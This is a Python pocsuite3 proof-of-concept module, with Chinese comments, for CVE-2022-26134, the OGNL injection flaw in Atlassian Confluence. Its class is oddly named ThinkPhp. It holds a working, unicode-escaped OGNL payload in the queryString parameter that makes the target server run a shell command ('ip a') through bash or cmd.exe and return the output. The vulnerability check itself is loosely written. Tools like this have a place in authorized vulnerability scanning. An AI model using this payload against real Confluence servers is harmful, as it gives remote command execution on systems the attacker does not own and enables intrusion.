from pocsuite3.api import (
    Output,
    POCBase,
    POC_CATEGORY,
    register_poc,
    requests,
    VUL_TYPE,
)


class ThinkPhp(POCBase):
    vulID = "26084"  # ssvid ID 如果是提交漏洞的同时提交 PoC,则写成 0
    version = "1"  # 默认为1
    author = "19gh"  # PoC作者的大名
    vulDate = "2022-06-06"  # 漏洞公开的时间,不知道就写今天
    createDate = "2022-7-15"  # 编写 PoC 的日期
    updateDate = "2022-7-15"  # PoC 更新的时间,默认和编写时间一样
    references = ["https://github.com/luck-ying/Library-POC"]  # 漏洞地址来源,0day不用写
    name = "CVE-2022-26134 操作系统命令注入漏洞 PoC"  # PoC 名称
    appPowerLink = ""  # 漏洞厂商主页地址
    appName = "Atlassian Confluence 存在远程代码执行漏洞"  # 漏洞应用名称
    appVersion = """
    Confluence < 6.13.23
    6.14.0 ≤ Confluence < 7.4.11
    7.5.0 ≤ Confluence < 7.11.6
    7.12.0 ≤ Confluence < 7.12.5
    Confluence < 7.13.0
    """  # 漏洞影响版本
    vulType = VUL_TYPE.COMMAND_EXECUTION  # 漏洞类型,类型参考见 漏洞类型规范表
    category = POC_CATEGORY.EXPLOITS.WEBAPP
    samples = [""]  # 测试样列,就是用 PoC 测试成功的网站
    install_requires = []  # PoC 第三方模块依赖，请尽量不要使用第三方模块，必要时请参考《PoC第三方模块依赖说明》填写
    desc = """
                Atlassian Confluence 存在远程代码执行漏洞 攻击者可通过远程命令执行，浏览敏感信息或进行敏感操作
            """  # 漏洞简要描述
    pocDesc = """
                /pages/createpage-entervariables.action?SpaceKey=x        
            """  # POC用法描述

    def _check(self):
        result = []

        # 漏洞验证代码
        full_url = f"{self.url}/pages/createpage-entervariables.action?SpaceKey=x"
        headers = {
            "User-Agent": "Mozilla/5.0 (X11; Gentoo; rv:82.1) Gecko/20100101 Firefox/82.1",
            "Content-Type": "application/x-www-form-urlencoded"}
        params = {
            "queryString": "aaaaaaaa\\u0027+{Class.forName(\\u0027javax.script.ScriptEngineManager\\u0027).newInstance().getEngineByName(\\u0027JavaScript\\u0027).\\u0065val(\\u0027var isWin = java.lang.System.getProperty(\\u0022os.name\\u0022).toLowerCase().contains(\\u0022win\\u0022); var cmd = new java.lang.String(\\u0022ip a\\u0022);var p = new java.lang.ProcessBuilder(); if(isWin){p.command(\\u0022cmd.exe\\u0022, \\u0022/c\\u0022, cmd); } else{p.command(\\u0022bash\\u0022, \\u0022-c\\u0022, cmd); }p.redirectErrorStream(true); var process= p.start(); var inputStreamReader = new java.io.InputStreamReader(process.getInputStream()); var bufferedReader = new java.io.BufferedReader(inputStreamReader); var line = \\u0022\\u0022; var output = \\u0022\\u0022; while((line = bufferedReader.readLine()) != null){output = output + line + java.lang.Character.toString(10); }\\u0027)}+\\u0027"}
        try:
            response = requests.post(full_url, headers=headers, data=params,
                                timeout=10, verify=False)


            # 判断是否存在漏洞
            if response.status_code == 200 and 'inet' and 'inet6' in response.text:
                result.append(self.url)

        except Exception as e:
            print(e)
        finally:
            return result

    def _verify(self):
        result = {}
        res = self._check()  # res就是返回的结果列表
        if res:
            result['VerifyInfo'] = {}
            result['VerifyInfo']['Info'] = self.name
            result['VerifyInfo']['vul_url'] = self.url
            result['VerifyInfo']['vul_detail'] = self.desc
        return self.parse_verify(result)

    def _attack(self):
        return self._verify()

    def parse_verify(self, result):
        output = Output(self)
        if result:
            output.success(result)
        else:
            output.fail('Target is not vulnerable')
        return output


def other_fuc():
    pass


def other_utils_func():
    pass


# 注册 DemoPOC 类
register_poc(ThinkPhp)
